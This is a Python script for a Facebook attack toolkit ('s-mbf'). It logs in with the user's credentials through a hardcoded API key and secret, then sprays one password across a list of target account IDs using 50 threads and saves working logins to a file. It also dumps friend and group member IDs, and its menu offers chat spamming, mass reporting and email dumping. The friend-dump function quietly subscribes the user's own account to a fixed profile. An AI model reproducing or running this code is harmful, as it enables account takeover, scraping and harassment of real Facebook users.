#!usr/bin/python3.7
#Author: KANG-NEWBIE
#contact: t.me/kang_nuubi
#github: github.com/kang-newbie
try:
	from multiprocessing.pool import ThreadPool
	from crayons import *
	from src import DOS
	from getpass import getpass
	import os, requests, sys, json, time, hashlib, random, shutil
except Exception as F:
	exit("[ModuleErr] %s"%(F))

if sys.version[0] in '2':
	exit("[sorry] use python version 3")

#remove cache
try:
	shutil.rmtree("src/__pycache__")
except: pass

#banner
def banner():
	print(cyan('   _____ __  ______  ____',bold=True))
	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('1.6',bold=True))

try:
	toket=open('toket/token.txt')
	toket.close()
except IOError:
		try:
			DOS.Dos()

			banner()
			try:
				os.mkdir('toket')
			except OSError: pass
			print('\n[!] login to your facebook account first');id = input('[?] Username : ');pwd = getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data,headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
			res=requ.json()['access_token']
			o=open('toket/token.txt','w')
			o.write(res)
			print("[!] success generate access token")
			print("[!] access token saved: toket/token.txt")
			time.sleep(3)
			o.close()
		except KeyError:
			print("[!] failed generate access token")
			print("[!] Check your username/password")
			exit()
		except (KeyboardInterrupt,EOFError):
			exit("\n[!] Key interrupt: exit.")
		except Exception as F:
			exit("[Error] %s"%(F))

def getFid():
	banner()
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("\n[in] your friends id: ")
		b=open('dump/friends_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
		s=json.loads(re.text)
		for i in s['friends']['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved	'%(i['id']), end=''),;sys.stdout.flush();time.sleep(0.0001)
		print('\n[!] all friends id successfuly retreived')
		print("[!] file saved: dump/friends_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[!] Key interrupt: Stoped.")
	except KeyError:
		os.remove('dump/friends_'+str(id)+'_id.txt')
		exit('[!] failed to fetch friend id')

def getGid():
	banner()
	try:
		os.mkdir('dump')
	except OSError: pass
	class dumps:
		def __init__(self):
			self.req=requests.Session()
			self.id=input("\n[in] your groups id: ")
			self.b=open('dump/group_'+self.id+'_id.txt','w')
			self.dum(f"https://graph.facebook.com/{self.id}/members?fields=id&limit=999999999&access_token={str(toket)}")
		
		def dum(self,idi):
			self.re=self.req.get(idi).json()
			for i in self.re['data']:
				self.b.write(i['id'] + '\n')
				c=open('dump/group_'+self.id+'_id.txt').readlines()
				print('\r[%s] %s retrieved	'%(len(c),i['id']),end=''),;sys.stdout.flush();time.sleep(0.000000001)

			try:
				self.dum(self.re["paging"]["next"])
			except:
				print('\n[!] all group id successfuly retreived')
				print("[!] file saved: dump/group_%s_id.txt"%(self.id))
				exit()
	try:			
		dumps()
	except (KeyboardInterrupt,EOFError):
		exit("[!] Key interrupt: Stoped.")

def rmtoken():
	print("""
1. remove access token
2. remove cookies
3. remove access token & cookies
""")
	pilihan=int(input("/kang-newbie_> "))
	if pilihan == 1:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			exit("[!] success removed access token")
		else: exit("[!] wrong input: exit")
	elif pilihan == 2:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			try:
				os.remove('toket/kue.txt')
			except FileNotFoundError: exit("[?] cookies not found")
			exit("[!] success removed cookies")
		else: exit("[!] wrong input: exit")
	elif pilihan == 3:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			os.remove('toket/kue.txt')
			exit("[!] success removed access token & cookies")
		else: exit("[!] wrong input: exit")
	else: exit("[exit] wrong input")

def update():
	print("[!] updating...")
	if os.name in ['nt','win32']:
		os.system('cd .. & del s-mbf')
		os.system('cd .. & git clone https://github.com/KANG-NEWBIE/s-mbf')
	else:
		os.system('cd;rm -rf s-mbf')
		os.system('cd;git clone https://github.com/KANG-NEWBIE/s-mbf')
		exit()

cek=[]
tap=[]
crk=[]
def main(arg):
        try:
                url='https://mbasic.facebook.com/login'
                dt={'email':arg,'pass':pas,'login':'submit'}
                head={'User-Agent':'Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18'}
                req=requests.post(url,data=dt,headers=head)
                respData = req.content
                if 'save-device' in str(respData) or 'm_sess' in str(respData):
                        true='yeah'
                        live="%s|%s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        f=open('result/found.txt','a')
                        f.write(tulis)
                        f.close()
                elif 'checkpoint' in str(respData):
                        true='notbad'
                        cek.append(true)
                        CP="%s|%s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        f=open('result/cek.txt','a')
                        f.write(wrt)
                        f.close()
                crk.append(arg)
                print("\r[ CRACK ] >> %s/%s F[%s] CP[%s] <<"%(len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
        except: pass

DOS.Dos()
banner()
try:
	toket=open('toket/token.txt','r').read()
	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
	name=nam.json()['name']

	upver='v.1.7'
	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if upver in str(requp):
		print(yellow('\nNew version available. update your s-mbf now!'))
except KeyError:
	print("\n[Warning] access token invalid. type '5' to remove access token")
except requests.exceptions.RequestException:
	exit("\n[Err] Check your internet connection")
try:
	print(white('\t[ Welcome'),yellow(name,bold=True),white(']'))
	print("""
[01]> Simple multi bruteforce facebook
[02]> Dump id from your friends
[03]> Dump id from your group
[04]> Dump id with search name
[05]> Remove access token/cookies
[06]> Accept all friends requests
[07]> Add friends from target id
[08]> React comments target
[09]> Home comments
[10]> Group comment
[11]> Comments target
[12]> Auto unfriends
[13]> Auto reactions
[14]> Auto follow
[15]> Chat spammer
[16]> Auto posting status
[17]> Auto Reporting
[18]> Dump email
[19]> Check bind apps
[20]> Deleted post
[21]> Checker accounts
[00]> Check update""")
except (KeyError,NameError): pass

pilih=int(input('\n[#] kang-newbie/> '))
if pilih == 2:
	DOS.Dos()
	getFid()
elif pilih == 3:
	DOS.Dos()
	getGid()
elif pilih == 4:
	DOS.Dos()
	import src.DumpS
	exit()
elif pilih == 5:
	rmtoken()
elif pilih == 6:
	DOS.Dos()
	import src.Facc
	exit()
elif pilih == 7:
	DOS.Dos()
	import src.Fadd
	exit()
elif pilih == 8:
	DOS.Dos()
	import src.Kreact
	exit()
elif pilih == 9:
	DOS.Dos()
	import src.komen
	exit()
elif pilih == 10:
	DOS.Dos()
	import src.Gkomen
	exit()
elif pilih == 11:
	DOS.Dos()
	import src.Tkomen
	exit()
elif pilih == 12:
	DOS.Dos()
	import src.Unf
	exit()
elif pilih == 13:
	input("[info] before use this module you must have a lot accounts [press enter to continue]")
	DOS.Dos()
	import src.Mreact
	exit()
elif pilih == 14:
	input("[Info] before use this module you must have a lot accounts [press enter]")
	DOS.Dos()
	import src.Asubs
	exit()
elif pilih == 15:
	DOS.Dos()
	import src.Cspam
	exit()
elif pilih == 16:
	DOS.Dos()
	import src.Apost
	exit()
elif pilih == 17:
	DOS.Dos()
	import src.Mreport
	exit()
elif pilih == 18:
	DOS.Dos()
	import src.Edump
	exit()
elif pilih == 19:
	DOS.Dos()
	import src.Capp
	exit()
elif pilih == 20:
	DOS.Dos()
	import src.Delpos
	exit()
elif pilih == 21:
	DOS.Dos()
	import src.Cekun
	exit()
elif pilih == 0:
	print("\n[!] Checking update")
	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if upver in str(rr):
		update()
	else: exit("[!] already up to date")
else:
	DOS.Dos()
	banner()

try:
        file=open(input("\n[in] Id List Target: ")).read().splitlines()
        pas=input("[in] Password to Crack: ")
except (KeyboardInterrupt,EOFError):
        exit(red("\n[!] Key interrupt: Exiting."))
except FileNotFoundError:
        exit(red("\n[!] File not found: Exiting."))

o=[]
for x in file:
    o.append(x)
print(cyan('\n[ Cracking',bold=True),green(len(o),bold=True),cyan('ID With Password',bold=True),yellow(pas,bold=True),cyan(']',bold=True))
p=ThreadPool(50)
next=p.map(main,o)

if len(file) == 0:
	exit("%s[!] File empty\n"%(r))
if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
else: print(f"\n[ {yellow(':(',bold=True)} ] nothing found")
if len(tap) > 0:
	print("found result saved: result/found.txt")
if len(cek) > 0:
	print("check result saved: result/cek.txt")